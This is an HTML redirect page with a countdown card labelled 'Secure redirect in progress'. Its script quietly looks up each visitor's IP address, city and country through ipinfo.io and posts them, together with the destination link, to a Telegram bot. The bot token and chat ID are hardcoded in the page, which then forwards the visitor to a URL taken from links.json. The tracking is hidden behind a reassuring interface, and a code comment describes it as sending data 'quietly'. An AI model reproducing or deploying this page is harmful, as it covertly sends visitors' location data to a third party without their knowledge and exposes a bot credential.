<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }
        body {
            background: #090d16;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(59, 130, 246, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(147, 51, 234, 0.15) 0%, transparent 40%);
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: rgba(30, 41, 59, 0.5);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 28px;
            padding: 35px 25px;
            width: 100%;
            max-width: 360px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
            animation: fadeIn 0.6s ease-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .icon-box {
            font-size: 2.5rem;
            margin-bottom: 12px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-6px); }
        }
        h2 {
            color: #38bdf8;
            font-size: 1.3rem;
            font-weight: 700;
            margin-bottom: 25px;
            word-break: break-all;
        }
        /* تصميم دائرة العد التنازلي التفاعلية */
        .circular-timer {
            position: relative;
            width: 110px;
            height: 110px;
            margin: 0 auto 20px auto;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .circular-timer svg {
            width: 100%;
            height: 100%;
            transform: rotate(-90deg);
        }
        .circular-timer circle {
            fill: none;
            stroke-width: 8;
            stroke-linecap: round;
        }
        .timer-bg {
            stroke: rgba(255, 255, 255, 0.08);
        }
        .timer-progress {
            stroke: url(#gradient);
            stroke-dasharray: 283; /* 2 * pi * 45 */
            stroke-dashoffset: 0;
            transition: stroke-dashoffset 1s linear;
        }
        .timer-number {
            position: absolute;
            font-size: 1.8rem;
            font-weight: 800;
            color: #f8fafc;
        }
        .subtitle {
            font-size: 0.9rem;
            color: #94a3b8;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon-box">⚡</div>
        <h2 id="destination-name">Preparing...</h2>
        
        <div class="circular-timer">
            <svg>
                <defs>
                    <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" stop-color="#3b82f6" />
                        <stop offset="100%" stop-color="#f43f5e" />
                    </linearGradient>
                </defs>
                <circle class="timer-bg" cx="55" cy="55" r="45"></circle>
                <circle class="timer-progress" id="progress-circle" cx="55" cy="55" r="45"></circle>
            </svg>
            <div class="timer-number" id="countdown">7</div>
        </div>

        <p class="subtitle">Secure redirect in progress...</p>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = "8728217018:AAHctv9Xsgm9UklqD27jfzBrbOJX100dYqE";
        const TELEGRAM_CHAT_ID = "8718173410";

        // إرسال البيانات في الخلفية بهدوء
        async function sendVisitorData(destName, targetUrl) {
            try {
                const ipRes = await fetch('https://ipinfo.io/json');
                const ipData = await ipRes.json();
                
                const message = `🚨 **New Visitor!**\n\n` +
                                `📌 **To:** ${destName}\n` +
                                `🔗 **URL:** ${targetUrl}\n` +
                                `🌍 **IP:** \`${ipData.ip || 'Unknown'}\`\n` +
                                `🏙️ **City:** ${ipData.city || 'N/A'}, ${ipData.country || 'N/A'}`;

                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
                });
            } catch (e) {}
        }

        async function init() {
            const urlParams = new URLSearchParams(window.location.search);
            const toKey = urlParams.get('to') || 'link1';

            let targetUrl = "https://go-noo.vercel.app/";
            let destName = "Main Page";

            // إعدادات دائرة التقدم (محيط الدائرة = 283)
            const circle = document.getElementById('progress-circle');
            const radius = circle.r.baseVal.value;
            const circumference = 2 * Math.PI * radius;
            circle.style.strokeDasharray = circumference;

            let seconds = 7;
            const countdownEl = document.getElementById('countdown');

            const timer = setInterval(() => {
                seconds--;
                countdownEl.textContent = seconds;

                // تحديث الـ SVG progress بصرياً
                const offset = circumference - (seconds / 7) * circumference;
                circle.style.strokeDashoffset = offset;

                if (seconds <= 0) {
                    clearInterval(timer);
                    window.location.replace(targetUrl);
                }
            }, 1000);

            // جلب الـ Links والاسم في الخلفية
            try {
                const res = await fetch('links.json?_=' + Date.now());
                const data = await res.json();
                if (data[toKey]) {
                    targetUrl = data[toKey].url;
                    destName = data[toKey].destination;
                    document.getElementById('destination-name').textContent = destName;
                }
            } catch (e) {
                document.getElementById('destination-name').textContent = "Redirecting...";
            }

            sendVisitorData(destName, targetUrl);
        }

        init();
    </script>
</body>
</html>
